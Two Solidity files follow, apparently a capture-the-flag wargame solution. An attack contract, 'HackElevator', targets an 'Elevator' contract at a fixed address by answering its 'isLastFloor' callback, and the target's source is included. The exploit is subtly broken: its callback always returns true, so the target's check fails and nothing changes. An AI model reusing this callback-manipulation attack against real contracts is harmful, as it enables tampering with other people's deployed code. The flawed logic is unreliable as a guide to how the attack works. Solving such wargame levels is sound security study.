// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import './Elevator.sol';

contract HackElevator is Building {
  Elevator public originalContract = Elevator(0x9053035BFd8b391CD30a9246d175E659AE518d31); 

    function hack() public {
        originalContract.goTo(1);
    }
    
    function isLastFloor(uint) view public returns (bool) {
      return true;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}